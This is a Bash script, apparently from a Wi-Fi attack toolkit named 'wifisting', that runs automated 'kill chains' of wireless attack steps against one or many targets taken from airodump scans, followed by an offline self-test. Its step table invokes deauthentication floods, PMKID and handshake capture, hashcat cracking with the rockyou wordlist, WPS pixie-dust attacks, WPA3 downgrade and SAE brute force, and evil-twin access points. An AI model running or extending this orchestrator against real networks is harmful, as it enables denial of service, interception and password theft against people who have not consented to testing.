#!/usr/bin/env bash
# 29_killchain.sh — chain runner with timeouts, conditionals, variables
set -u
TMP="${TMP_DIR:-/tmp/wifisting}"
KC="$TMP/killchain"
mkdir -p "$KC"
PAUSE="$KC/paused"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WIF="${WIFISTING_ROOT:-$(dirname "$SCRIPT_DIR")}"

# Chain variable namespace. Steps can read/write these via the
# emit protocol: `VAR\tNAME\tVALUE` from a step script sets the var.
declare -A KC_VARS

emit_step()    { printf 'STEP\t%s\t%s\n' "$1" "$2"; }
emit_done()    { printf 'DONE\t%s\t%s\n' "$1" "$2"; }   # idx, status (ok|fail|skip)
emit_err()     { printf 'ERROR\t%s\t%s\n' "$1" "$2"; }
emit_var()     { printf 'VAR\t%s\t%s\n' "$1" "$2"; }

# Expand ${VAR} and $VAR in a string using the KC_VARS map.
expand_vars() {
    local s="$1"
    python3 - "$s" "${!KC_VARS[@]}" -- "${KC_VARS[@]}" 2>/dev/null <<'PY' || printf '%s' "$s"
import re, os, sys
s = sys.argv[1]
argv = sys.argv[2:]
if '--' in argv:
    idx = argv.index('--')
    names = argv[:idx]
    values = argv[idx+1:]
    env = dict(zip(names, values))
else:
    env = {}
# ${VAR} or $VAR
def repl(m):
    name = m.group(1) or m.group(2)
    return env.get(name, os.environ.get(name, ''))
print(re.sub(r'\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)', repl, s), end='')
PY
}

# Parse a step line: `step<TAB>id<TAB>arg<TAB>[timeout]`
# arg may contain variables like ${TARGET_BSSID}
# timeout is seconds (default 120, 0=no timeout)
run_step() {
    local idx="$1" id="$2" arg="${3:-}" timeout="${4:-120}"
    arg=$(expand_vars "$arg")

    emit_step "$idx" "$id"

    local rc=0
    local cmd=()

    case "$id" in
      iface_kill)     cmd=(pkexec "$WIF/modules/01_iface.sh" --kill-conflicts) ;;
      iface_monitor)  cmd=(pkexec "$WIF/modules/01_iface.sh" --monitor-on "$arg") ;;
      iface_managed)  cmd=(pkexec "$WIF/modules/01_iface.sh" --monitor-off "$arg") ;;
      iface_restore)  cmd=(pkexec "$WIF/modules/01_iface.sh" --restore-network) ;;
      lock_channel)   cmd=(pkexec "$WIF/modules/28_live_traffic.sh" --lock-channel "$arg" "${KC_VARS[CH]:-6}") ;;
      # `pkexec timeout N script` would make the program /usr/bin/timeout,
      # which the polkit rule does not cover. Bound the scan from inside the
      # script instead so pkexec still targets a /wifisting/modules/ program.
      recon_scan)     cmd=(pkexec "$WIF/modules/02_recon.sh" --start-scan all "${arg:-30}") ;;
      live_stream)    cmd=(bash -c "\"$WIF/modules/28_live_traffic.sh\" --stream \"$arg\" >/dev/null 2>&1 &") ;;
      sleep_n)        cmd=(sleep "${arg:-5}") ;;
      capture_start)  cmd=(bash -c "\"$WIF/modules/03_attack.sh\" --capture-start \"${arg:-/tmp/wifisting/kc_cap}\" >/dev/null 2>&1 & echo \$! > \"$KC/cap.pid\"") ;;
      capture_stop)   cmd=(bash -c "[ -f \"$KC/cap.pid\" ] && kill -INT \"\$(cat \"$KC/cap.pid\")\" 2>/dev/null; sleep 1") ;;
      deauth_bcast)   cmd=("$WIF/modules/03_attack.sh" --deauth-broadcast 10) ;;
      deauth_flood)   cmd=("$WIF/modules/03_attack.sh" --deauth-flood "${arg:-30}") ;;
      deauth_client)  cmd=("$WIF/modules/03_attack.sh" --deauth-client "$arg" 10) ;;
      pmkid)          cmd=("$WIF/modules/03_attack.sh" --pmkid "${arg:-60}") ;;
      convert)        cmd=("$WIF/modules/03_attack.sh" --convert) ;;
      crack_rockyou)  cmd=("$WIF/modules/18_capture_analysis.sh" --crack "${arg:-}" 22000 /usr/share/wordlists/rockyou.txt 0 0 0) ;;
      crack_rules)    cmd=(hashcat -m 22000 "$arg" -r /usr/share/hashcat/rules/best64.rule) ;;
      crack_wait)     cmd=(sleep $(( 60 * ${arg:-5} ))) ;;
      wps_scan)       cmd=(pkexec "$WIF/modules/17_wps_attack.sh" --scan-tsv "${arg:-30}") ;;
      wps_pixie)      cmd=(pkexec "$WIF/modules/17_wps_attack.sh" --start pixie "$arg" "${KC_VARS[CH]:-6}") ;;
      wps_harvest)    cmd=("$WIF/modules/17_wps_attack.sh" --harvest) ;;
      wpa3_downgrade) cmd=("$WIF/modules/47_wpa3_attack.sh" --downgrade "$arg" "$arg" "${KC_VARS[CH]:-6}" 60) ;;
      wpa3_capture)   cmd=("$WIF/modules/47_wpa3_attack.sh" --capture "$arg" "$arg" "${KC_VARS[CH]:-6}" 120) ;;
      wpa3_sae)       cmd=("$WIF/modules/47_wpa3_attack.sh" --sae-brute "$arg" "$arg" /usr/share/wordlists/rockyou.txt) ;;
      et_launch)      cmd=(pkexec "$WIF/modules/04_eviltwin.sh" --launch "$arg" "$arg" "${KC_VARS[CH]:-6}") ;;
      et_stop)        cmd=(pkexec "$WIF/modules/04_eviltwin.sh" --teardown) ;;
      kill_children)  cmd=(bash -c 'pkill -P $$ 2>/dev/null || true') ;;
      save_log)       cmd=(bash -c "{ echo \"chain=\${KC_CHAIN:-unknown}\"; date; } >> \"$KC/sessions.log\"") ;;
      open_loot)      cmd=(bash -c ':') ;;
      set_var)
        # set_var NAME=VALUE
        local kv_name="${arg%%=*}"
        local kv_val="${arg#*=}"
        [[ "$kv_name" == "$arg" ]] && { emit_err "$idx" "set_var needs NAME=VALUE"; return 2; }
        KC_VARS[$kv_name]="$kv_val"
        emit_var "$kv_name" "$kv_val"
        return 0
        ;;
      assert_var)
        # assert_var NAME=expected — skip remaining if mismatch
        local kv_name="${arg%%=*}"
        local kv_expected="${arg#*=}"
        if [[ "${KC_VARS[$kv_name]:-}" != "$kv_expected" ]]; then
            emit_err "$idx" "assert failed: $kv_name != $kv_expected"
            return 3
        fi
        return 0
        ;;
      if_var)
        # if_var NAME=value STEPID [ARG] — run STEPID only if var matches
        local kv_name="${arg%%=*}"
        local rest="${arg#*=}"
        local expected="${rest%% *}"
        local inner="${rest#* }"
        if [[ "${KC_VARS[$kv_name]:-}" == "$expected" ]]; then
            local inner_id="${inner%% *}"
            local inner_arg="${inner#* }"
            [[ "$inner_arg" == "$inner_id" ]] && inner_arg=""
            run_step "$idx($inner_id)" "$inner_id" "$inner_arg" "$timeout"
            return $?
        fi
        return 0
        ;;
      *)
        emit_err "$idx" "unknown step: $id"
        return 1
        ;;
    esac

    # Execute with optional timeout
    if (( timeout > 0 )); then
        timeout "$timeout" "${cmd[@]}" 2>/dev/null
        rc=$?
        if (( rc == 124 )); then
            emit_done "$idx" "fail(timeout)"
            return "$rc"
        fi
    else
        "${cmd[@]}" 2>/dev/null
        rc=$?
    fi

    if (( rc == 0 )); then
        emit_done "$idx" "ok"
    else
        emit_done "$idx" "fail"
    fi
    return "$rc"
}

# Parse chain header vars (CH, IFACE) if present
kc_load_chain_meta() {
    local chain="$1"
    while IFS=$'\t' read -r key val _; do
        case "$key" in
            meta)  # meta<TAB>KEY<TAB>VALUE
                KC_VARS[$val]="${_:-}"
                ;;
        esac
    done < "$chain"
}

kc_run_one_chain() {
    local chain="$1"
    local total idx=0

    KC_VARS=()
    KC_VARS[CHAIN]="$chain"

    # Load metadata if present
    while IFS=$'\t' read -r key id arg timeout; do
        [ "$key" = "meta" ] || continue
        KC_VARS[$id]="$arg"
    done < "$chain"

    # Count real steps
    total=$(grep -c '^step' "$chain")

    # Track overall success for early termination
    local overall=0

    while IFS=$'\t' read -r key id arg timeout; do
        [ "$key" = "step" ] || continue
        idx=$((idx+1))

        # Pause barrier
        while [ -e "$PAUSE" ]; do sleep 0.4; done

        # Default timeout if not specified
        [[ -z "${timeout:-}" ]] && timeout=120

        local rc=0
        run_step "$idx/$total" "$id" "${arg:-}" "$timeout" || rc=$?

        # assert_var returns 3 — skip remaining steps
        if (( rc == 3 )); then
            emit_err "0/$total" "chain aborted at step $idx"
            return 1
        fi

        # Steps returning 4 abort the chain (custom signal)
        if (( rc == 4 )); then
            emit_err "0/$total" "chain aborted at step $idx (user)"
            return 1
        fi

        (( rc != 0 )) && overall=1
    done < "$chain"

    return "$overall"
}

# ── multi-target ──

kc_resolve_targets() {
    local mode="${1:-all}"
    local csv
    csv=$(ls -t "$TMP_DIR"/recon/scan-*.csv 2>/dev/null | head -1)
    [ -z "$csv" ] && return 0
    RECON_CSV="$csv" KC_MODE="$mode" python3 - <<'PY'
import csv, os
p = os.environ["RECON_CSV"]
mode = os.environ["KC_MODE"]
def c(v): return (v or "").strip()
targets = []
try:
    fh = open(p, encoding="utf-8-sig", errors="replace", newline="")
except OSError:
    raise SystemExit(0)
with fh:
    r = csv.reader(fh)
    headers = None
    for raw in r:
        row = [c(v) for v in raw]
        if not any(row): continue
        if row[0] == "BSSID":
            headers = row; continue
        if row[0] == "Station MAC": break
        if not headers: continue
        row += [""] * (len(headers) - len(row))
        rec = dict(zip(headers, row))
        bssid = c(rec.get("BSSID"))
        if not bssid: continue
        essid = c(rec.get("ESSID")) or "<hidden>"
        ch = c(rec.get("channel")) or "6"
        power = c(rec.get("Power")) or "-999"
        try: pwr = int(power)
        except ValueError: pwr = -999
        targets.append((pwr, bssid, essid, ch))
targets.sort(reverse=True)
if mode == "best":
    targets = targets[:1]
for _, b, e, c_ in targets:
    print("\t".join([b, e, c_]))
PY
}

# ── self-test ────────────────────────────────────────────────────────────
# Chains are plain TAB-separated files, so the parser, variable expansion,
# step sequencing and --run-multi target loop are all testable offline with
# synthetic chains built from steps that touch nothing (set_var, assert_var,
# if_var, open_loot, sleep_n). Scratch state is redirected so the live
# /tmp/wifisting/killchain, pause flag and target files are never touched.
#
# NB: this module runs under `set -u`, so every optional read uses :-.
kc_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }

    local MOD_TMP="${TMP_DIR:-/tmp/wifisting}/killchain/selftest"
    rm -rf "$MOD_TMP"; mkdir -p "$MOD_TMP/recon"
    local s_tmp="$TMP" s_kc="$KC" s_pause="$PAUSE" s_tmpdir="${TMP_DIR:-}"
    TMP="$MOD_TMP"; KC="$MOD_TMP/killchain"; PAUSE="$KC/paused"; TMP_DIR="$MOD_TMP"
    mkdir -p "$KC"

    local out rc
    local MOD="${BASH_SOURCE[0]}"

    # 1. emit protocol shape
    chk emit-step "$(emit_step 3 iface_kill)" $'STEP\t3\tiface_kill'
    chk emit-done "$(emit_done 3 ok)"         $'DONE\t3\tok'
    chk emit-error "$(emit_err 3 boom)"       $'ERROR\t3\tboom'
    chk emit-var  "$(emit_var A 1)"           $'VAR\tA\t1'

    # 2. variable expansion from the KC_VARS map, then the environment
    KC_VARS=()
    chk expand-plain    "$(expand_vars 'plain')" plain
    chk expand-unset    "$(expand_vars 'x${NOPE_XYZ}y')" xy
    chk expand-unset-bare "$(expand_vars 'x$NOPE_XYZ-y')" "x-y"
    KC_VARS[TARGET]=wlan0
    chk expand-braced   "$(expand_vars '${TARGET}')" wlan0
    chk expand-bare     "$(expand_vars '$TARGET')" wlan0
    chk expand-mixed    "$(expand_vars 'a${TARGET}b$TARGET')" awlan0bwlan0
    KC_VARS[KC_TEST_ENV]=frommap
    export KC_TEST_ENV=fromenv
    chk expand-map-wins "$(expand_vars '${KC_TEST_ENV}')" frommap
    unset 'KC_VARS[KC_TEST_ENV]' KC_TEST_ENV
    chk expand-env-only "$(expand_vars '${KC_TEST_ENV}')" ""
    KC_VARS=()

    # 3. step primitives: set_var / assert_var / unknown step
    #    (run_step is called directly, not in $(), so KC_VARS changes stick)
    run_step 1 set_var "FOO=bar" > "$MOD_TMP/rs.out" 2>&1; rc=$?
    chk setvar-rc    "$rc" 0
    chk setvar-map   "${KC_VARS[FOO]:-}" bar
    chk setvar-emits "$(awk -F'\t' '$1=="VAR"{print $3}' "$MOD_TMP/rs.out")" bar
    run_step 2 set_var "NOVALUE" > "$MOD_TMP/rs.out" 2>&1; rc=$?
    chk setvar-bad-rc  "$rc" 2
    chk setvar-bad-msg "$(awk -F'\t' '$1=="ERROR"{print $3}' "$MOD_TMP/rs.out")" "set_var needs NAME=VALUE"
    run_step 3 assert_var "FOO=bar" > "$MOD_TMP/rs.out" 2>&1; rc=$?
    chk assert-match-rc     "$rc" 0
    chk assert-match-emits-step "$(grep -c '^STEP' "$MOD_TMP/rs.out")" 1
    chk assert-match-no-error   "$(grep -cE '^(ERROR|DONE)' "$MOD_TMP/rs.out")" 0
    run_step 4 assert_var "FOO=nope" > "$MOD_TMP/rs.out" 2>&1; rc=$?
    chk assert-mismatch-rc  "$rc" 3
    chk assert-mismatch-msg "$(awk -F'\t' '$1=="ERROR"{print $3}' "$MOD_TMP/rs.out")" "assert failed: FOO != nope"
    run_step 7 bogus_step > "$MOD_TMP/rs.out" 2>&1; rc=$?
    chk unknown-step-rc  "$rc" 1
    chk unknown-step-msg "$(awk -F'\t' '$1=="ERROR"{print $3}' "$MOD_TMP/rs.out")" "unknown step: bogus_step"

    # 3b. if_var: branches on a chain variable instead of aborting.
    #     Regression guard: the condition used to read an undefined variable,
    #     which under `set -u` killed the whole runner on every if_var step.
    run_step 5 if_var "FOO=bar open_loot" > "$MOD_TMP/rs.out" 2>&1; rc=$?
    chk ifvar-true-rc    "$rc" 0
    chk ifvar-true-inner "$(awk -F'\t' '$1=="STEP" && $3=="open_loot"{print $2}' "$MOD_TMP/rs.out")" "5(open_loot)"
    chk ifvar-true-done  "$(awk -F'\t' '$1=="DONE"{print $3}' "$MOD_TMP/rs.out")" ok
    chk ifvar-true-arg   "$(awk -F'\t' '$1=="STEP" && $3=="open_loot"{print $3}' "$MOD_TMP/rs.out")" open_loot
    run_step 6 if_var "FOO=other open_loot" > "$MOD_TMP/rs.out" 2>&1; rc=$?
    chk ifvar-false-rc     "$rc" 0
    chk ifvar-false-step   "$(awk -F'\t' '$1=="STEP" && $3=="if_var"' "$MOD_TMP/rs.out" | grep -c .)" 1
    chk ifvar-false-skipped "$(grep -c 'open_loot' "$MOD_TMP/rs.out")" 0
    run_step 8 if_var "NEVER_SET=1 open_loot" > "$MOD_TMP/rs.out" 2>&1; rc=$?
    chk ifvar-unset-rc       "$rc" 0
    chk ifvar-unset-no-abort "$(grep -c 'unbound variable' "$MOD_TMP/rs.out")" 0
    chk ifvar-unset-skipped  "$(grep -c 'open_loot' "$MOD_TMP/rs.out")" 0
    run_step 9 if_var "FOO=bar sleep_n 0" > "$MOD_TMP/rs.out" 2>&1; rc=$?
    chk ifvar-inner-arg-rc  "$rc" 0
    chk ifvar-inner-arg-id  "$(awk -F'\t' '$1=="STEP" && $3=="sleep_n"{print $2}' "$MOD_TMP/rs.out")" "9(sleep_n)"

    # 4. execution: success, failure and timeout are distinguished
    out=$(run_step 1 open_loot 2>&1); rc=$?
    chk exec-ok-rc   "$rc" 0
    chk exec-ok-done "$(printf '%s\n' "$out" | awk -F'\t' '$1=="DONE"{print $3}')" ok
    out=$(run_step 1 sleep_n abc 5 2>&1); rc=$?
    chk exec-fail-rc   "$rc" 1
    chk exec-fail-done "$(printf '%s\n' "$out" | awk -F'\t' '$1=="DONE"{print $3}')" fail
    out=$(run_step 1 sleep_n 5 1 2>&1); rc=$?
    chk exec-timeout-rc   "$rc" 124
    chk exec-timeout-done "$(printf '%s\n' "$out" | awk -F'\t' '$1=="DONE"{print $3}')" "fail(timeout)"

    # 5. chain sequencing: order, meta vars, per-step index/total
    local chain="$MOD_TMP/chain.tsv"
    {
        printf 'meta\tCH\t11\n'
        printf 'comment\tignored\tline\n'
        printf 'step\tset_var\tTARGET=abc\t10\n'
        printf 'step\tassert_var\tTARGET=abc\n'
        printf 'step\topen_loot\n'
    } > "$chain"
    kc_run_one_chain "$chain" > "$MOD_TMP/chain.out" 2>&1; rc=$?
    out=$(cat "$MOD_TMP/chain.out")
    chk chain-rc      "$rc" 0
    chk chain-meta    "${KC_VARS[CH]:-}" 11
    chk chain-steps   "$(printf '%s\n' "$out" | grep -c '^STEP')" 3
    chk chain-order   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="STEP"{printf "%s ",$3}')" "set_var assert_var open_loot "
    chk chain-index   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="STEP"{printf "%s ",$2}')" "1/3 2/3 3/3 "
    # only executing steps emit DONE; the internal set_var/assert_var do not
    chk chain-done-ok "$(printf '%s\n' "$out" | awk -F'\t' '$1=="DONE" && $2=="3/3" && $3=="ok"' | grep -c .)" 1
    chk chain-done-count "$(printf '%s\n' "$out" | grep -c '^DONE')" 1

    # ... an empty chain is not an error, it just runs nothing
    : > "$MOD_TMP/empty.tsv"
    out=$(kc_run_one_chain "$MOD_TMP/empty.tsv" 2>&1); rc=$?
    chk chain-empty-rc    "$rc" 0
    chk chain-empty-steps "$(printf '%s\n' "$out" | grep -c '^STEP')" 0

    # ... an unknown step fails that step but does not silently stop the chain
    printf 'step\tbogus_step\nstep\topen_loot\n' > "$chain"
    out=$(kc_run_one_chain "$chain" 2>&1); rc=$?
    chk chain-badstep-rc      "$rc" 1
    chk chain-badstep-report  "$(printf '%s\n' "$out" | grep -c $'^ERROR\t1/2\tunknown step: bogus_step')" 1
    chk chain-badstep-continues "$(printf '%s\n' "$out" | grep -c $'^STEP\t2/2\topen_loot')" 1

    # ... a failed assertion aborts the rest of the chain
    printf 'step\tset_var\tT=1\nstep\tassert_var\tT=2\nstep\topen_loot\n' > "$chain"
    out=$(kc_run_one_chain "$chain" 2>&1); rc=$?
    chk chain-abort-rc      "$rc" 1
    chk chain-abort-msg     "$(printf '%s\n' "$out" | grep -c 'chain aborted at step 2')" 1
    chk chain-abort-stops   "$(printf '%s\n' "$out" | grep -c 'open_loot')" 0
    chk chain-abort-steps   "$(printf '%s\n' "$out" | grep -c '^STEP')" 2

    # ... if_var branches: taken runs the inner step, untaken skips it and
    #     the chain carries on to the next step either way
    printf 'step\tset_var\tT=1\nstep\tif_var\tT=1 open_loot\nstep\topen_loot\n' > "$chain"
    out=$(kc_run_one_chain "$chain" 2>&1); rc=$?
    chk chain-ifvar-true-rc   "$rc" 0
    chk chain-ifvar-true-runs "$(printf '%s\n' "$out" | grep -c $'^STEP\t2/3(open_loot)\topen_loot')" 1
    chk chain-ifvar-continues "$(printf '%s\n' "$out" | grep -c $'^STEP\t3/3\topen_loot')" 1
    printf 'step\tset_var\tT=1\nstep\tif_var\tT=9 open_loot\nstep\topen_loot\n' > "$chain"
    out=$(kc_run_one_chain "$chain" 2>&1); rc=$?
    chk chain-ifvar-false-rc        "$rc" 0
    chk chain-ifvar-false-skips     "$(printf '%s\n' "$out" | grep -c '2/3(open_loot)')" 0
    chk chain-ifvar-false-continues "$(printf '%s\n' "$out" | grep -c $'^STEP\t3/3\topen_loot')" 1
    chk chain-ifvar-false-done      "$(printf '%s\n' "$out" | grep -c 'unbound variable')" 0

    # ... a malformed set_var is an error but the chain keeps going
    printf 'step\tset_var\tNOVALUE\nstep\topen_loot\n' > "$chain"
    out=$(kc_run_one_chain "$chain" 2>&1); rc=$?
    chk chain-badset-rc        "$rc" 1
    chk chain-badset-continues "$(printf '%s\n' "$out" | grep -c $'^STEP\t2/2\topen_loot')" 1

    # 6. airodump CSV -> target list (power-sorted, hidden ESSID, best mode)
    {
        printf 'BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key\n'
        printf '\n'
        printf 'AA:BB:CC:00:00:03, 2024-01-01 10:00:00, 2024-01-01 10:01:00, 6, 54, WPA2, CCMP, PSK, -70, 3, 0, 0.0.0.0, 5, "Third",\n'
        printf 'AA:BB:CC:00:00:01, 2024-01-01 10:00:00, 2024-01-01 10:01:00, 11, 54, WPA2, CCMP, PSK, -40, 3, 0, 0.0.0.0, 5, "First",\n'
        printf 'AA:BB:CC:00:00:02, 2024-01-01 10:00:00, 2024-01-01 10:01:00, 1, 54, OPN, , , -55, 3, 0, 0.0.0.0, 0, "",\n'
        printf 'AA:BB:CC:00:00:04, 2024-01-01 10:00:00, 2024-01-01 10:01:00, 11, 54, WPA2, CCMP, PSK\n'
        printf '\nStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n'
        printf '11:22:33:44:55:66, 2024-01-01 10:00:00, 2024-01-01 10:01:00, -30, 4, AA:BB:CC:00:00:09, "ShouldNotAppear"\n'
    } > "$MOD_TMP/recon/scan-1.csv"
    out=$(kc_resolve_targets all)
    chk resolve-rows     "$(printf '%s\n' "$out" | grep -c .)" 4
    chk resolve-fields   "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=3{c++} END{print c+0}')" 0
    chk resolve-sorted   "$(printf '%s\n' "$out" | cut -f1 | tr '\n' ' ')" \
        "AA:BB:CC:00:00:01 AA:BB:CC:00:00:02 AA:BB:CC:00:00:03 AA:BB:CC:00:00:04 "
    chk resolve-essid    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="AA:BB:CC:00:00:01"{print $2}')" '"First"'
    chk resolve-channel  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="AA:BB:CC:00:00:01"{print $3}')" 11
    chk resolve-quoted-empty "$(printf '%s\n' "$out" | awk -F'\t' '$1=="AA:BB:CC:00:00:02"{print $2}')" '""'
    chk resolve-hidden   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="AA:BB:CC:00:00:04"{print $2}')" "<hidden>"
    chk resolve-missing-power-last "$(printf '%s\n' "$out" | tail -1 | cut -f1)" "AA:BB:CC:00:00:04"
    chk resolve-station-ignored "$(printf '%s\n' "$out" | grep -c 'ShouldNotAppear')" 0
    chk resolve-best-one "$(kc_resolve_targets best | grep -c .)" 1
    chk resolve-best-top "$(kc_resolve_targets best | cut -f1)" "AA:BB:CC:00:00:01"
    mkdir -p "$MOD_TMP/norecon"
    TMP_DIR="$MOD_TMP/norecon"
    chk resolve-none-empty "$(kc_resolve_targets all | grep -c .)" 0
    chk resolve-none-rc    "$(kc_resolve_targets all >/dev/null 2>&1; echo $?)" 0
    TMP_DIR="$MOD_TMP"

    # 7. CLI: rejection paths and the --run-multi target/delay loop
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --run "$MOD_TMP/absent.tsv" 2>&1); rc=$?
    chk cli-run-missing-rc  "$rc" 1
    chk cli-run-missing-msg "$(printf '%s\n' "$out" | grep -c 'chain not found')" 1
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --run-multi 2>&1); rc=$?
    chk cli-multi-noargs-rc "$rc" 1
    chk cli-multi-noargs-no-success "$(printf '%s\n' "$out" | grep -c 'MULTI_DONE')" 0
    # No positional may be read bare under `set -u`: a missing argv must reach
    # the usage guard instead of aborting with "unbound variable".
    chk cli-multi-noargs-nounbound "$(printf '%s\n' "$out" | grep -c 'unbound variable')" 0
    chk cli-multi-noargs-usage "$(printf '%s\n' "$out" | grep -c '^usage:.*--run-multi')" 1
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --run 2>&1); rc=$?
    chk cli-run-noargs-rc       "$rc" 1
    chk cli-run-noargs-nounbound "$(printf '%s\n' "$out" | grep -c 'unbound variable')" 0
    chk cli-run-noargs-usage    "$(printf '%s\n' "$out" | grep -c '^usage:.*--run CHAIN')" 1
    # ... and the same for a --run-multi with a chain but no targets
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --run-multi "$MOD_TMP/absent.tsv" 2>&1); rc=$?
    chk cli-multi-notargets-arg-rc "$rc" 1
    chk cli-multi-notargets-arg-nounbound "$(printf '%s\n' "$out" | grep -c 'unbound variable')" 0
    chk cli-multi-notargets-arg-usage "$(printf '%s\n' "$out" | grep -c '^usage:.*--run-multi')" 1
    printf 'step\topen_loot\n' > "$MOD_TMP/ok.tsv"
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --run-multi "$MOD_TMP/ok.tsv" "$MOD_TMP/absent.tsv" 2>&1); rc=$?
    chk cli-multi-notargets-rc  "$rc" 1
    chk cli-multi-notargets-msg "$(printf '%s\n' "$out" | grep -c 'targets not found')" 1
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --bogus 2>&1); rc=$?
    chk cli-usage-rc  "$rc" 2
    chk cli-usage-msg "$(printf '%s\n' "$out" | grep -c '^usage:')" 1

    # a chain that substitutes the per-target environment into a step var
    printf 'step\tset_var\tGOT=${TARGET_BSSID}\nstep\topen_loot\n' > "$MOD_TMP/multi.tsv"
    printf 'AA:BB:CC:DD:EE:01\tNet1\t6\nAA:BB:CC:DD:EE:02\tNet2\t11\n' > "$MOD_TMP/targets.tsv"
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --run-multi "$MOD_TMP/multi.tsv" "$MOD_TMP/targets.tsv" 0 2>&1); rc=$?
    chk multi-rc        "$rc" 0
    chk multi-done      "$(printf '%s\n' "$out" | grep -c '^MULTI_DONE')" 1
    chk multi-targets   "$(printf '%s\n' "$out" | grep -c '^TARGET')" 2
    chk multi-first     "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TARGET" && $2=="1/2"{print $3}')" "AA:BB:CC:DD:EE:01"
    chk multi-second    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TARGET" && $2=="2/2"{print $3}')" "AA:BB:CC:DD:EE:02"
    chk multi-var-sub   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="VAR" && $2=="GOT"{printf "%s ",$3}')" \
        "AA:BB:CC:DD:EE:01 AA:BB:CC:DD:EE:02 "
    chk multi-delay-line "$(printf '%s\n' "$out" | grep -c $'^ITER_DELAY\t0$')" 1
    chk multi-delay-once "$(printf '%s\n' "$out" | grep -c '^ITER_DELAY')" 1

    # ... and a failing chain still reports CHAIN_DONE with a non-zero rc
    printf 'step\tbogus_step\n' > "$MOD_TMP/bad.tsv"
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --run "$MOD_TMP/bad.tsv" 2>&1); rc=$?
    chk cli-run-fail-rc   "$rc" 1
    chk cli-run-fail-done "$(printf '%s\n' "$out" | grep -c $'^CHAIN_DONE\t1$')" 1
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --run "$MOD_TMP/ok.tsv" 2>&1); rc=$?
    chk cli-run-ok-rc   "$rc" 0
    chk cli-run-ok-done "$(printf '%s\n' "$out" | grep -c $'^CHAIN_DONE\t0$')" 1

    # 8. pause / resume flag
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --pause 2>&1); rc=$?
    chk pause-rc   "$rc" 0
    chk pause-says "$(printf '%s\n' "$out" | grep -c '^PAUSED')" 1
    chk pause-file "$([[ -e "$KC/paused" ]] && echo 1 || echo 0)" 1
    out=$(TMP_DIR="$MOD_TMP" bash "$MOD" --resume 2>&1); rc=$?
    chk resume-rc   "$rc" 0
    chk resume-says "$(printf '%s\n' "$out" | grep -c '^RESUMED')" 1
    chk resume-file "$([[ -e "$KC/paused" ]] && echo 1 || echo 0)" 0

    TMP="$s_tmp"; KC="$s_kc"; PAUSE="$s_pause"; TMP_DIR="$s_tmpdir"
    rm -rf "$MOD_TMP"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
case "${1:-}" in
    --selftest) kc_selftest; exit $? ;;
    --run)
        chain="${2:-}"
        [ -n "$chain" ] || {
            echo "usage: $0 --run CHAIN   (no chain given)" >&2; exit 1; }
        [ -f "$chain" ] || { echo "chain not found: $chain" >&2; exit 1; }
        export KC_CHAIN="$chain"
        kc_run_one_chain "$chain"
        rc=$?
        printf 'CHAIN_DONE\t%s\n' "$rc"
        exit "$rc"
        ;;
    --run-multi)
        chain="${2:-}"
        targets="${3:-}"
        delay="${4:-5}"
        { [ -n "$chain" ] && [ -n "$targets" ]; } || {
            echo "usage: $0 --run-multi CHAIN TARGETS [DELAY]   (missing chain or targets)" >&2
            exit 1; }
        [ -f "$chain" ]   || { echo "chain not found" >&2; exit 1; }
        [ -f "$targets" ] || { echo "targets not found" >&2; exit 1; }
        total=$(wc -l < "$targets")
        idx=0
        while IFS=$'\t' read -r bssid essid ch; do
            [ -z "$bssid" ] && continue
            idx=$((idx+1))
            printf 'TARGET\t%d/%d\t%s\t%s\t%s\n' \
                "$idx" "$total" "$bssid" "$essid" "$ch"
            export TARGET_BSSID="$bssid"
            export TARGET_ESSID="$essid"
            export TARGET_CHANNEL="$ch"
            echo "$bssid" > "$TMP_DIR/target_bssid"
            echo "$essid" > "$TMP_DIR/target_essid"
            echo "$ch"    > "$TMP_DIR/target_channel"
            kc_run_one_chain "$chain"
            if [ "$idx" -lt "$total" ]; then
                printf 'ITER_DELAY\t%s\n' "$delay"
                sleep "$delay"
            fi
        done < "$targets"
        printf 'MULTI_DONE\n'
        ;;
    --resolve)
        kc_resolve_targets "${2:-all}"
        ;;
    --pause)
        : > "$PAUSE"
        printf 'PAUSED\n'
        ;;
    --resume)
        rm -f "$PAUSE"
        printf 'RESUMED\n'
        ;;
    *)
        echo "usage: $0 --run CHAIN | --run-multi CHAIN TARGETS DELAY | --resolve MODE | --pause | --resume | --selftest" >&2
        exit 2
        ;;
esac
fi
